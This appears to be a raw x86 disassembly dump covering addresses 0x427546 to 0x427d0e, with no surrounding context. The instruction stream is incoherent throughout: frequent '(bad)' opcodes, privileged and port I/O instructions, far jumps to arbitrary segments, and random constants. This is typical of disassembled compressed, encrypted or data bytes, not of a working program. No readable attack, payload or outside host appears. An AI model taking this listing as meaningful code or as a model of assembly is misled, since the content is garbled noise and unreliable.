  427546:	mov    dh,0xf1
  427548:	mov    dl,0xf1
  42754a:	or     eax,0xc8ba0588
  42754f:	pop    ss
  427550:	fsubr  DWORD PTR [edi-0x5]
  427553:	push   ss
  427554:	mov    dh,0x12
  427556:	ins    DWORD PTR es:[edi],dx
  427557:	cmc    
  427558:	or     cl,BYTE PTR [ebp+0x53af4a1]
  42755e:	mov    cl,0xd0
  427560:	outs   dx,BYTE PTR ds:[esi]
  427561:	xchg   BYTE PTR [eax],bh
  427563:	imul   edi,DWORD PTR [eax-0x6f],0x7d
  427567:	xor    DWORD PTR [ebp-0x65],esi
  42756a:	stos   BYTE PTR es:[edi],al
  42756b:	pop    eax
  42756c:	mov    edx,0xce9565c9
  427571:	aaa    
  427572:	pop    es
  427573:	pop    esp
  427574:	inc    ebp
  427575:	ins    DWORD PTR es:[edi],dx
  427576:	arpl   WORD PTR [ebx+0x871fe6d],sp
  42757c:	repz mov ecx,0xdb44a530
  427582:	push   edx
  427583:	sbb    eax,0xeb977bd0
  427588:	not    edx
  42758a:	fiadd  WORD PTR [edx]
  42758c:	or     edx,DWORD PTR [edi]
  42758e:	(bad)  
  427590:	stos   DWORD PTR es:[edi],eax
  427591:	mov    ah,0xe3
  427593:	jo     0x427539
  427595:	xchg   ebp,eax
  427596:	dec    ebp
  427597:	loopne 0x4275a9
  427599:	loopne 0x427593
  42759b:	mov    ds:0xbc6b6d85,al
  4275a0:	mov    DWORD PTR [esi+0x5f],esi
  4275a3:	ss xor al,0x92
  4275a6:	sub    ch,0xc2
  4275a9:	(bad)  
  4275aa:	sbb    eax,0xef374920
  4275af:	xchg   ebx,eax
  4275b0:	push   ebx
  4275b1:	ss inc esi
  4275b3:	inc    ebx
  4275b4:	add    al,0x9b
  4275b6:	pushf  
  4275b7:	in     al,dx
  4275b8:	leave  
  4275b9:	jae    0x4275a6
  4275bb:	sbb    ebx,edx
  4275bd:	add    ebx,DWORD PTR [ebx]
  4275bf:	shr    BYTE PTR [esi+0x6e],0x83
  4275c3:	push   ecx
  4275c4:	repz mov edi,0x142b741d
  4275ca:	sahf   
  4275cb:	mov    BYTE PTR [ebx+esi*1-0x66],dh
  4275cf:	push   0x3
  4275d1:	push   ecx
  4275d2:	mov    cl,0xab
  4275d4:	mov    dh,0x76
  4275d6:	and    BYTE PTR [edi+0xd18fea6],dh
  4275dc:	inc    esp
  4275dd:	lahf   
  4275de:	jbe    0x427562
  4275e0:	mov    gs:0xc3393311,eax
  4275e6:	shr    esp,0xa2
  4275e9:	test   DWORD PTR [ebx-0x5c],ecx
  4275ec:	test   BYTE PTR [ecx+0x76d77f4c],al
  4275f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275f3:	sub    BYTE PTR [edx-0x477aef8b],bh
  4275f9:	bound  edi,QWORD PTR [ebx]
  4275fb:	rcl    esi,0x8
  4275fe:	pusha  
  4275ff:	jmp    0x4275e6
  427601:	push   0x2d018e9
  427606:	mov    cl,BYTE PTR es:[ebx]
  427609:	in     eax,dx
  42760a:	out    dx,al
  42760b:	(bad)  
  42760c:	ja     0x42765a
  42760e:	inc    ebx
  42760f:	mov    ss,esp
  427611:	outs   dx,BYTE PTR ds:[esi]
  427612:	pop    ebx
  427613:	push   edi
  427614:	aam    0xb0
  427616:	dec    edi
  427617:	stc    
  427618:	jo     0x427606
  42761a:	jmp    0x6e1bca6c
  42761f:	aaa    
  427620:	cmp    cl,BYTE PTR [eax+0x7cbdb344]
  427626:	pop    es
  427627:	mov    bl,0x9d
  427629:	fsubr  DWORD PTR [esi]
  42762b:	jne    0x427631
  42762d:	out    0x78,eax
  42762f:	pop    esp
  427630:	sub    DWORD PTR [ebx+0x1d],ecx
  427633:	fucomp st(5)
  427635:	mov    dh,0xb0
  427637:	push   eax
  427638:	or     ch,BYTE PTR [esi]
  42763a:	mov    eax,ds:0xaf237e5b
  42763f:	hlt    
  427640:	mov    ecx,0xb42ed6ed
  427645:	sar    BYTE PTR [edx-0x54],0xd8
  427649:	loop   0x4276ad
  42764b:	outs   dx,BYTE PTR ds:[esi]
  42764c:	ins    DWORD PTR es:[edi],dx
  42764d:	cmp    eax,0xa9b68d50
  427652:	mov    BYTE PTR [edx+0xb],dh
  427655:	or     DWORD PTR [ebx],edx
  427657:	das    
  427658:	dec    esi
  427659:	mov    eax,ds:0x82add475
  42765e:	shl    BYTE PTR [edx-0x5b1e9962],1
  427664:	sbb    ebp,DWORD PTR [ebp-0x7f]
  427667:	mov    dh,0x5a
  427669:	xor    cl,BYTE PTR [ecx+0x21]
  42766c:	mov    DWORD PTR [edx+0x1b8a8ec2],eax
  427672:	sbb    edi,DWORD PTR [esi-0x40]
  427675:	pusha  
  427676:	mov    bh,0xb0
  427678:	bound  ecx,QWORD PTR ds:0x75db6c45
  42767e:	jae    0x4276b8
  427680:	lods   al,BYTE PTR ds:[esi]
  427681:	int    0x91
  427683:	sub    edi,DWORD PTR [esi]
  427685:	push   0xffffffbb
  427687:	mov    cl,0xb5
  427689:	jmp    0x6a52:0x124a5080
  427690:	jecxz  0x4276eb
  427692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427693:	lea    esp,[eax-0x11239cfd]
  427699:	sub    BYTE PTR [eax],ah
  42769b:	in     eax,dx
  42769c:	mov    dh,0x35
  42769e:	mov    bl,ch
  4276a0:	cmp    edi,eax
  4276a2:	cmc    
  4276a3:	pop    edi
  4276a4:	sub    edx,ecx
  4276a6:	stos   BYTE PTR es:[edi],al
  4276a7:	fnsave [esi]
  4276a9:	xchg   esi,eax
  4276aa:	outs   dx,DWORD PTR ds:[esi]
  4276ab:	dec    ebp
  4276ac:	rcl    DWORD PTR [esi+0x0],1
  4276af:	ins    BYTE PTR es:[edi],dx
  4276b0:	ss (bad) 
  4276b2:	call   0xdb8ed858
  4276b7:	sahf   
  4276b8:	fadd   DWORD PTR [ebp+eiz*8-0x6]
  4276bc:	out    dx,eax
  4276bd:	inc    eax
  4276be:	cmp    BYTE PTR [edi-0x2ee2a3e3],0xc2
  4276c5:	jbe    0x42771f
  4276c7:	maxps  xmm6,XMMWORD PTR [edx]
  4276ca:	jbe    0x427725
  4276cc:	adc    eax,0x223a8d48
  4276d1:	mov    dh,0xf9
  4276d3:	out    0x91,al
  4276d5:	fs nop
  4276d7:	add    al,0x2e
  4276d9:	rol    BYTE PTR ds:0x97631ec4,1
  4276df:	popa   
  4276e0:	fistp  DWORD PTR [ecx+ebp*8]
  4276e3:	adc    eax,0xb68a1a97
  4276e8:	mov    BYTE PTR [eax],cl
  4276ea:	enter  0xec48,0x20
  4276ee:	pusha  
  4276ef:	add    edi,DWORD PTR [edi+0x4c]
  4276f2:	pop    edx
  4276f3:	adc    eax,0x52b38aa
  4276f8:	sbb    eax,0x96123751
  4276fd:	jge    0x427701
  4276ff:	fcom   DWORD PTR [esi*2+0x66c74cb0]
  427706:	dec    edi
  427707:	mov    ch,0x5b
  427709:	add    ebp,edx
  42770b:	(bad)  
  42770c:	test   DWORD PTR [ebp-0x3425d2c5],0xb6ed4b6d
  427716:	cmp    BYTE PTR [edx-0x7d],bh
  427719:	lahf   
  42771a:	xchg   esp,eax
  42771b:	out    dx,eax
  42771c:	je     0x4276d4
  42771e:	add    eax,0xa05c051d
  427723:	add    eax,0xda23c056
  427728:	mov    cl,0x6d
  42772a:	sub    al,0x74
  42772c:	stc    
  42772d:	jbe    0x4276db
  42772f:	pushf  
  427730:	sbb    BYTE PTR [esi-0x71],cl
  427733:	mul    DWORD PTR [ebp+0x2ab0b806]
  427739:	ficom  WORD PTR [eax]
  42773b:	pop    esp
  42773c:	add    ah,0x37
  42773f:	or     esi,DWORD PTR [esi-0x545a25ea]
  427745:	xchg   bh,ch
  427747:	xor    eax,0x76329408
  42774c:	rcl    ch,0x45
  42774f:	sub    al,0x5c
  427751:	and    eax,0xfa143a46
  427756:	int3   
  427757:	pop    ss
  427758:	fidiv  DWORD PTR [esi-0x40f31bb]
  42775e:	loop   0x4277b0
  427760:	fnstcw WORD PTR [edx]
  427762:	cmc    
  427763:	sub    BYTE PTR [ebp+0x3],0x11
  427767:	lods   eax,DWORD PTR ds:[esi]
  427768:	dec    eax
  427769:	mov    es,WORD PTR [ebx-0x49fa6808]
  42776f:	mov    fs,WORD PTR [edi-0x456ba304]
  427775:	mov    ecx,0xe201d096
  42777a:	(bad)  
  42777b:	adc    al,0xaf
  42777d:	in     eax,0x38
  42777f:	outs   dx,DWORD PTR ds:[esi]
  427780:	retf   
  427781:	fcmovnu st,st(3)
  427783:	push   ss
  427784:	fidiv  DWORD PTR [esi+0x672051cc]
  42778a:	cmp    ecx,DWORD PTR [edi+0x2a]
  42778d:	sbb    eax,0xb6db352c
  427792:	icebp  
  427793:	jno    0x427730
  427795:	(bad)  
  427796:	xchg   ebx,eax
  427797:	mov    al,ds:0xa36be127
  42779c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42779d:	arpl   WORD PTR [edx+0x6d],bp
  4277a0:	in     al,dx
  4277a1:	mov    ch,BYTE PTR [edi+0x48]
  4277a4:	and    ch,BYTE PTR [edi+0x56fdf296]
  4277aa:	les    edx,FWORD PTR [esi+0xa]
  4277ad:	or     BYTE PTR [eax-0x50],ch
  4277b0:	mov    ecx,0xa8d6e8a9
  4277b5:	mov    cl,0x59
  4277b7:	(bad)  
  4277b8:	repnz inc ebp
  4277ba:	add    BYTE PTR [edx+0x47],ah
  4277bd:	mov    ch,0x30
  4277bf:	adc    DWORD PTR [ecx-0x8],ecx
  4277c2:	scas   al,BYTE PTR es:[edi]
  4277c3:	sbb    edx,0xffffffb6
  4277c6:	ins    DWORD PTR es:[edi],dx
  4277c7:	and    eax,0x1f47659f
  4277cc:	mov    ecx,0x2ed60270
  4277d1:	ins    BYTE PTR es:[edi],dx
  4277d2:	mov    ah,0x6d
  4277d4:	rol    ebp,cl
  4277d6:	xor    bl,cl
  4277d8:	data16 cs jbe 0x42784c
  4277dc:	add    eax,0x8b841bb5
  4277e1:	je     0x427807
  4277e3:	add    al,0x91
  4277e5:	fnsave es:[esi+0x7802a152]
  4277ec:	adc    al,0xbf
  4277ee:	mov    dh,0xda
  4277f0:	dec    esp
  4277f1:	test   cl,dl
  4277f3:	ss inc ebp
  4277f5:	mov    al,0xd1
  4277f7:	fbld   TBYTE PTR [esi]
  4277f9:	ins    DWORD PTR es:[edi],dx
  4277fa:	push   esp
  4277fb:	sbb    eax,0xb6ed8fdb
  427800:	xor    BYTE PTR [edx],bl
  427802:	mov    dh,0xa6
  427804:	call   0xd4f3ee89
  427809:	lds    esp,FWORD PTR [ecx-0x48f4fb05]
  42780f:	sbb    bl,dh
  427811:	add    DWORD PTR [esi-0x4e],ebp
  427814:	icebp  
  427815:	(bad)
  427819:	sbb    eax,0xcf8ff8d6
  42781e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42781f:	out    dx,al
  427820:	push   ds
  427821:	xor    al,0x15
  427823:	fnstsw WORD PTR [edx-0x50d6cd5b]
  427829:	push   0x44ad766f
  42782e:	sub    eax,0xeef02e2c
  427833:	xchg   ebx,eax
  427834:	test   eax,0x450d4bfe
  427839:	fistp  DWORD PTR [eax]
  42783b:	cmp    cl,dh
  42783d:	sbb    eax,0x611a0bfb
  427842:	push   ss
  427843:	fimul  DWORD PTR [esi]
  427845:	cmp    BYTE PTR [ebx+0x52],0x7d
  427849:	dec    edx
  42784a:	mov    dh,0x43
  42784c:	mov    edi,0xdb70b4a3
  427851:	(bad)
  427854:	gs ret 
  427856:	mov    ch,0xff
  427858:	inc    ecx
  427859:	repz das 
  42785b:	ins    BYTE PTR es:[edi],dx
  42785c:	fld    TBYTE PTR [ebp-0x25]
  42785f:	cmc    
  427860:	mov    al,ds:0xcb6295a2
  427865:	cmp    al,0x43
  427867:	mov    ch,0x0
  427869:	(bad)  
  42786a:	mov    al,ds:0x3f960086
  42786f:	mov    ecx,0xda162b8f
  427874:	push   cs
  427875:	fiadd  DWORD PTR [edx+0x6a3fca8f]
  42787b:	sbb    al,BYTE PTR [ecx]
  42787d:	pop    esi
  42787e:	sub    al,0x34
  427880:	adc    eax,0x2da959dd
  427885:	and    al,0x7c
  427887:	jo     0x4278ae
  427889:	mov    al,0x35
  42788b:	rol    DWORD PTR [esi],0x8a
  42788e:	jl     0x427825
  427890:	js     0x4278fa
  427892:	out    dx,al
  427893:	in     eax,dx
  427894:	(bad)  
  427895:	mov    dh,0xb4
  427897:	std    
  427898:	mov    bh,0x3e
  42789a:	pop    ebp
  42789b:	dec    edx
  42789c:	pop    ecx
  42789d:	setns  BYTE PTR [ebp+eax*1-0x4a]
  4278a2:	or     dh,BYTE PTR [esi]
  4278a4:	push   ebx
  4278a5:	ss mov cs,WORD PTR ds:[edx]
  4278a9:	stc    
  4278aa:	pop    edx
  4278ab:	pusha  
  4278ac:	xor    edx,esp
  4278ae:	sub    DWORD PTR [eax+0x7a2407d],eax
  4278b4:	mov    ch,0xd0
  4278b6:	add    DWORD PTR [ebp+0x5],ebx
  4278b9:	push   edi
  4278ba:	fcmovnbe st,st(6)
  4278bc:	es add al,0xf3
  4278bf:	rcl    BYTE PTR [esp+esi*4],0x44
  4278c3:	jmp    0xdda:0xd808efbd
  4278ca:	jecxz  0x427891
  4278cc:	pop    ss
  4278cd:	jp     0x4278d7
  4278cf:	mov    edx,ss
  4278d1:	lods   eax,DWORD PTR ds:[esi]
  4278d2:	add    ebx,edx
  4278d4:	pop    ecx
  4278d5:	stc    
  4278d6:	pop    esi
  4278d7:	mov    dh,0x65
  4278d9:	jp     0x4278e9
  4278db:	inc    esp
  4278dc:	mov    ch,0x6d
  4278de:	pop    ebp
  4278df:	sar    DWORD PTR [ecx],0x26
  4278e2:	xor    ebp,ecx
  4278e4:	mov    ah,0xd7
  4278e6:	rcl    DWORD PTR [esi],0xb6
  4278e9:	add    dh,BYTE PTR [ecx+0x174f7b16]
  4278ef:	pop    ecx
  4278f0:	cs stos DWORD PTR es:[edi],eax
  4278f2:	ds mov al,0x6d
  4278f5:	xchg   edi,eax
  4278f6:	sbb    eax,0xf17af4f7
  4278fb:	jmp    0x1b5de5a1
  427900:	mov    al,0xb5
  427902:	sub    eax,0x411d4315
  427907:	imul   ebx,DWORD PTR [ebp+eax*4-0x7a49490b],0x2
  42790f:	add    eax,DWORD PTR [edi]
  427911:	sub    al,0x4a
  427913:	test   BYTE PTR [eax],dl
  427915:	jmp    0x28594ff0
  42791a:	cmp    dh,0x95
  42791d:	fstp   QWORD PTR [ecx]
  42791f:	std    
  427920:	inc    eax
  427921:	pop    ss
  427922:	cmp    ah,al
  427924:	dec    eax
  427925:	aad    0x24
  427927:	and    bh,bl
  427929:	(bad)  
  42792a:	scas   al,BYTE PTR es:[edi]
  42792b:	in     eax,dx
  42792c:	and    dl,bl
  42792e:	ss dec ebp
  427930:	or     al,0xc0
  427932:	mov    DWORD PTR [edx-0x5c],esp
  427935:	je     0x4279b1
  427937:	push   esi
  427938:	mov    edx,0x9aa40175
  42793d:	inc    esp
  42793e:	clc    
  42793f:	aam    0x41
  427941:	into   
  427942:	add    eax,0x71c41682
  427947:	push   ecx
  427948:	sub    DWORD PTR [edx-0x16],ebx
  42794b:	test   al,0x5b
  42794d:	shr    DWORD PTR [ebx+ecx*1+0x9],cl
  427951:	xchg   ebx,eax
  427952:	add    eax,0x415d5b0d
  427957:	xchg   edi,eax
  427958:	push   edi
  427959:	fs shl ecx,1
  42795c:	jns    0x4278f8
  42795e:	outs   dx,DWORD PTR ds:[esi]
  42795f:	mov    cl,0xb0
  427961:	lock add eax,0x384fded6
  427967:	pop    ds
  427968:	aas    
  427969:	sbb    ebp,ebp
  42796b:	mov    dh,0xb0
  42796d:	push   ds
  42796e:	out    dx,eax
  42796f:	or     eax,0x2317594f
  427974:	mov    DWORD PTR [edi],esp
  427976:	ficom  DWORD PTR [ebp+0xb]
  427979:	or     ebx,DWORD PTR [ebx]
  42797b:	ror    BYTE PTR [edx-0x27],cl
  42797e:	pop    esi
  42797f:	mov    edx,edx
  427981:	mov    ch,0xd
  427983:	inc    ecx
  427984:	ins    BYTE PTR es:[edi],dx
  427985:	and    eax,DWORD PTR [edx+0x48]
  427988:	repz sub DWORD PTR [esi],esp
  42798b:	inc    ecx
  42798c:	mov    al,0xa1
  42798e:	mov    edx,0x86beaf20
  427993:	mov    esi,0x551a172d
  427998:	je     0x427986
  42799a:	and    al,0xef
  42799c:	add    al,0x29
  42799e:	pop    ebx
  42799f:	xchg   ebp,eax
  4279a0:	stos   BYTE PTR es:[edi],al
  4279a1:	(bad)  [eax-0x6b]
  4279a4:	out    0x85,eax
  4279a6:	pop    cx
  4279a8:	dec    ebp
  4279a9:	or     al,bl
  4279ab:	mov    edx,0x7ddd1a2d
  4279b0:	mov    dh,0x61
  4279b2:	add    edi,ecx
  4279b4:	fisubr DWORD PTR [edx]
  4279b6:	pop    esp
  4279b7:	call   0xfebe8945
  4279bc:	add    DWORD PTR [ebx-0x4e],ebx
  4279bf:	in     al,dx
  4279c0:	and    edx,esp
  4279c2:	inc    edx
  4279c3:	test   eax,0x6baaf72a
  4279c8:	push   eax
  4279c9:	ins    DWORD PTR es:[edi],dx
  4279ca:	ins    DWORD PTR es:[edi],dx
  4279cb:	push   edi
  4279cc:	mov    al,0x5b
  4279ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4279cf:	das    
  4279d0:	push   esp
  4279d1:	push   esi
  4279d2:	push   eax
  4279d3:	loopne 0x42799f
  4279d5:	sub    BYTE PTR [edx-0x30],cl
  4279d8:	mov    eax,0x2277e5ef
  4279dd:	into   
  4279de:	call   0xeda:0xe3d6c2e8
  4279e5:	cmp    eax,0x2369d911
  4279ea:	mov    al,0xb1
  4279ec:	xchg   ebp,eax
  4279ed:	mov    BYTE PTR [eax],dl
  4279ef:	mov    dh,0xa5
  4279f1:	pop    ebp
  4279f2:	call   0x46c3e27c
  4279f7:	mov    eax,0xad3d4b24
  4279fc:	mov    al,0x29
  4279fe:	mov    BYTE PTR [edx],al
  427a00:	ins    DWORD PTR es:[edi],dx
  427a01:	push   0xd8d7dca9
  427a06:	adc    al,0xc4
  427a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a09:	cdq    
  427a0a:	jecxz  0x427a26
  427a0c:	loopne 0x4279ae
  427a0e:	jmp    0x5317c184
  427a13:	push   eax
  427a14:	add    DWORD PTR [edi-0x75d1e4e9],ebx
  427a1a:	gs popa 
  427a1c:	jg     0x427a76
  427a1e:	push   ebp
  427a1f:	je     0x427a17
  427a21:	xchg   ecx,eax
  427a22:	mov    cl,0xb1
  427a24:	sub    eax,0x4d915640
  427a29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a2a:	mov    bh,0x40
  427a2c:	or     eax,0xdc02b636
  427a31:	retf   
  427a32:	dec    eax
  427a33:	mov    edx,0xd1bb4dd3
  427a38:	adc    al,al
  427a3a:	push   ecx
  427a3b:	shr    BYTE PTR [edx-0x52c26caf],0xda
  427a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a44:	xchg   DWORD PTR [ebp+0x3d],esp
  427a47:	jbe    0x4279ec
  427a49:	jge    0x427aa4
  427a4b:	sahf   
  427a4c:	adc    ebp,eax
  427a4e:	test   DWORD PTR [ebp-0x1ff63273],eax
  427a54:	xchg   esp,eax
  427a55:	mov    cl,0x4c
  427a57:	jbe    0x427ad1
  427a59:	(bad)  
  427a5a:	fist   DWORD PTR [esi]
  427a5c:	ss mov esi,0x9c6455a7
  427a62:	mov    dh,0x6d
  427a64:	sub    DWORD PTR [esi-0x44feeca5],0x48
  427a6b:	(bad)  
  427a6c:	or     ah,BYTE PTR [edx+0x4d]
  427a6f:	and    ch,dl
  427a71:	lods   eax,DWORD PTR ds:[esi]
  427a72:	in     eax,dx
  427a73:	stos   BYTE PTR es:[edi],al
  427a74:	mov    dh,0xca
  427a76:	xor    bh,BYTE PTR [eax+0x2]
  427a79:	sub    esi,DWORD PTR [edi+ecx*4-0x2527a7f5]
  427a80:	lea    esi,[ebx-0x10]
  427a83:	iret   
  427a84:	xor    DWORD PTR [ecx+0x35],ebx
  427a87:	nop
  427a88:	inc    esi
  427a89:	jo     0x427a38
  427a8b:	pop    ebx
  427a8c:	sub    edx,ebx
  427a8e:	test   dl,al
  427a90:	jecxz  0x427aee
  427a92:	outs   dx,DWORD PTR gs:[esi]
  427a94:	push   ss
  427a95:	data16 test al,0x1
  427a98:	xchg   esi,eax
  427a99:	lea    edx,[edx+0x44e6f68b]
  427a9f:	pop    ss
  427aa0:	add    eax,0xa585c55b
  427aa5:	cmp    bh,cl
  427aa7:	inc    esi
  427aa8:	add    ebp,DWORD PTR [ecx+eax*2]
  427aab:	stos   DWORD PTR es:[edi],eax
  427aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427aad:	stc    
  427aae:	jmp    0x427aa3
  427ab0:	dec    eax
  427ab1:	mov    eax,gs:0xd666e821
  427ab7:	mov    ch,0xeb
  427ab9:	icebp  
  427aba:	pop    ebp
  427abb:	add    edx,DWORD PTR [eax]
  427abd:	mov    bh,0xa5
  427abf:	pop    ss
  427ac0:	or     BYTE PTR [edi],ah
  427ac2:	dec    edx
  427ac3:	icebp  
  427ac4:	std    
  427ac5:	push   ebp
  427ac6:	sub    al,0xd0
  427ac8:	mov    dh,0x6d
  427aca:	fnstcw WORD PTR [esi]
  427acc:	pop    ecx
  427acd:	push   es
  427ace:	and    BYTE PTR [ecx],cl
  427ad0:	jno    0x427ad2
  427ad2:	pop    esp
  427ad3:	sub    ebx,DWORD PTR [eax+0x53bbb882]
  427ad9:	mov    ecx,DWORD PTR [edi+ecx*4]
  427adc:	sub    eax,0x5cedd0ff
  427ae1:	and    al,dh
  427ae3:	or     bh,BYTE PTR [ecx+0x130031b5]
  427ae9:	(bad)  
  427aeb:	or     BYTE PTR [ebx],0x1d
  427aee:	add    al,0xb3
  427af0:	cmc    
  427af1:	and    eax,0xa8569f8c
  427af6:	mov    dh,0xa1
  427af8:	sbb    ebx,DWORD PTR [eax+edi*4-0x4885b03e]
  427aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b00:	test   al,0xed
  427b02:	das    
  427b03:	add    al,0xe3
  427b05:	jecxz  0x427b1a
  427b07:	dec    esi
  427b08:	and    ebx,DWORD PTR [esp+edx*2+0x6a895b82]
  427b0f:	xchg   ebp,eax
  427b10:	pop    ebx
  427b11:	(bad)  
  427b13:	sub    eax,0xeda3616
  427b18:	(bad)  
  427b19:	enter  0x4119,0x2a
  427b1d:	retf   
  427b1e:	and    bl,bh
  427b20:	ss push esp
  427b22:	ins    BYTE PTR es:[edi],dx
  427b23:	aaa    
  427b24:	jmp    0x2e3f:0xdedaeb1f
  427b2b:	dec    ebx
  427b2c:	aad    0xb6
  427b2e:	inc    ebp
  427b2f:	xor    al,0x69
  427b31:	sub    BYTE PTR [edx],ah
  427b33:	loopne 0x427b21
  427b35:	mov    ah,0x2b
  427b37:	mov    bl,BYTE PTR [ebp-0x4d]
  427b3a:	xchg   ecx,eax
  427b3b:	in     al,dx
  427b3c:	sub    eax,esi
  427b3e:	retf   0x12b6
  427b41:	jne    0x427b53
  427b43:	enter  0x1b1a,0x7b
  427b47:	push   ecx
  427b48:	or     ebx,DWORD PTR [ebx-0x55]
  427b4b:	fcmovbe st,st(7)
  427b4d:	jmp    0x1970d4d8
  427b52:	sbb    eax,0x406b625d
  427b57:	pop    ds
  427b58:	stos   BYTE PTR es:[edi],al
  427b59:	pop    esp
  427b5a:	test   eax,0xb1b00506
  427b5f:	xor    eax,0xfb1d32a2
  427b64:	es lahf 
  427b66:	add    BYTE PTR [ecx],0xed
  427b69:	and    bh,BYTE PTR [eax-0x49d2ef39]
  427b6f:	mov    dl,0xeb
  427b71:	mov    dh,0xb5
  427b73:	ins    DWORD PTR es:[edi],dx
  427b74:	dec    ebp
  427b75:	add    eax,0xd7a80b31
  427b7a:	lods   eax,DWORD PTR ds:[esi]
  427b7b:	sub    BYTE PTR [ebx+0x71],0xb4
  427b7f:	fcmovnb st,st(2)
  427b81:	shl    BYTE PTR [ebp+0x17],cl
  427b84:	sbb    BYTE PTR [ebx+0x579c5611],bh
  427b8a:	add    bh,BYTE PTR [ebx]
  427b8c:	sub    BYTE PTR [esi+0x6c],0x18
  427b90:	add    ecx,DWORD PTR [edi]
  427b92:	test   eax,0x5e14687
  427b97:	ins    BYTE PTR es:[edi],dx
  427b98:	sbb    ebx,DWORD PTR [ebp+0x4]
  427b9b:	push   esi
  427b9c:	mov    ebp,0x7f3e225d
  427ba1:	mov    ebx,0xa86e50b0
  427ba6:	mov    BYTE PTR [ecx+ebx*1],ch
  427ba9:	xchg   ah,bl
  427bab:	inc    ebx
  427bac:	push   ebp
  427bad:	aam    0x1
  427baf:	dec    ebx
  427bb0:	adc    al,0x6d
  427bb2:	in     al,0xef
  427bb4:	pop    edi
  427bb5:	clc    
  427bb6:	call   0x34f3:0xde5d5ba2
  427bbd:	mov    esi,0x36303504
  427bc2:	adc    eax,0xaa62db71
  427bc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bc8:	push   ebp
  427bc9:	xchg   esi,eax
  427bca:	push   eax
  427bcb:	lahf   
  427bcc:	std    
  427bcd:	pop    ebp
  427bce:	fcomp  DWORD PTR [edx]
  427bd0:	add    bl,bl
  427bd2:	sahf   
  427bd3:	push   esi
  427bd4:	sbb    BYTE PTR [eax+0x116b0dd0],cl
  427bda:	sbb    eax,0xa0280301
  427bdf:	repnz sub al,BYTE PTR [edi-0x30]
  427be3:	jbe    0x427c26
  427be5:	retf   
  427be6:	jp     0x427c2f
  427be8:	jb     0x427bef
  427bea:	sub    BYTE PTR [ebp-0x207a51db],0x77
  427bf1:	push   0x8a0fad94
  427bf6:	clts   
  427bf8:	gs rcr ecx,0x6c
  427bfc:	ins    DWORD PTR es:[edi],dx
  427bfd:	sub    al,0x2d
  427bff:	in     eax,0x8
  427c01:	inc    edi
  427c02:	xchg   esi,eax
  427c03:	xchg   DWORD PTR [edx+ebp*2+0x6db6e37d],ecx
  427c0a:	pop    ebx
  427c0b:	pop    ebp
  427c0c:	sub    DWORD PTR [ebp-0x25f073a9],0x1bcf9822
  427c16:	add    al,0xae
  427c18:	pusha  
  427c19:	mov    edi,0x143ee5d7
  427c1e:	mov    bh,0x3a
  427c20:	sub    BYTE PTR [edi],0x8
  427c23:	cld    
  427c24:	dec    esp
  427c25:	mov    al,ds:0x82e8b74
  427c2a:	jbe    0x427bdc
  427c2c:	push   edi
  427c2d:	shl    bl,cl
  427c2f:	or     cl,BYTE PTR [edx-0x691d44f5]
  427c35:	fmul   st(2),st
  427c37:	in     eax,dx
  427c38:	out    0x99,eax
  427c3a:	sbb    ah,dh
  427c3c:	pop    edx
  427c3d:	pop    ebx
  427c3e:	or     ebx,DWORD PTR ds:0x9aef1205
  427c44:	iret   
  427c45:	inc    esi
  427c46:	pop    ds
  427c47:	les    eax,FWORD PTR [esi+0x48326db8]
  427c4d:	pop    edi
  427c4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c4f:	mov    al,0x0
  427c51:	xlat   BYTE PTR ds:[ebx]
  427c52:	push   0x55db65b4
  427c57:	mov    edi,ebx
  427c59:	mov    eax,0x5adbd47
  427c5e:	fnsave [esi+0x75126d52]
  427c64:	xor    eax,0x88444c80
  427c69:	popa   
  427c6a:	sub    dl,BYTE PTR [edi+0x5b]
  427c6d:	sti    
  427c6e:	mov    eax,ds:0x3a1d44e4
  427c73:	sub    eax,0xbb42e914
  427c78:	mov    ch,0xe0
  427c7a:	mov    dh,0x20
  427c7c:	mov    esi,0x379494d
  427c81:	in     al,dx
  427c82:	mov    eax,0xd752db6d
  427c87:	call   0xf050:0x56d1ed86
  427c8e:	imul   edi,DWORD PTR [eax-0x4aa7ebd3],0x108bea49
  427c98:	xchg   edx,eax
  427c99:	pop    esp
  427c9a:	xor    BYTE PTR ds:0xf10a9b11,cl
  427ca0:	int    0x18
  427ca2:	pop    ecx
  427ca3:	into   
  427ca4:	ins    BYTE PTR es:[edi],dx
  427ca5:	dec    edi
  427ca6:	push   esp
  427ca7:	sbb    esp,esp
  427ca9:	cmp    eax,DWORD PTR [edx-0x50]
  427cac:	repnz push 0x9
  427caf:	mov    eax,0xdcd92c2d
  427cb4:	push   ebp
  427cb5:	ret    0x4d2f
  427cb8:	in     eax,0xfa
  427cba:	push   esi
  427cbb:	inc    ecx
  427cbc:	add    DWORD PTR [edx+0x6d07bab2],esp
  427cc2:	sbb    ebx,ebx
  427cc4:	lea    edx,[ecx-0x2f]
  427cc7:	xchg   esp,eax
  427cc8:	xor    eax,0xdaf7729e
  427ccd:	fst    QWORD PTR [ecx-0x46]
  427cd0:	rcl    DWORD PTR ds:0x8a789001,1
  427cd6:	or     esi,0x2
  427cd9:	mov    eax,0xbe24bad0
  427cde:	loop   0x427d1a
  427ce0:	mov    esi,0xd0d44ae
  427ce5:	add    BYTE PTR [ebx],bl
  427ce7:	bound  ebp,QWORD PTR [esp+ebp*1-0x3a5f26e1]
  427cee:	add    eax,0x22041d6e
  427cf3:	xor    ebp,DWORD PTR [edx+0x74f6cd89]
  427cf9:	add    eax,0x157000b1
  427cfe:	bswap  ebp
  427d00:	fmul   st(2),st
  427d02:	das    
  427d03:	ins    BYTE PTR es:[edi],dx
  427d04:	dec    eax
  427d05:	shl    DWORD PTR [ebx+ebp*8],cl
  427d08:	enter  0xfd00,0xda
  427d0c:	jge    0x427d63
  427d0e:	jecxz  0x427d13
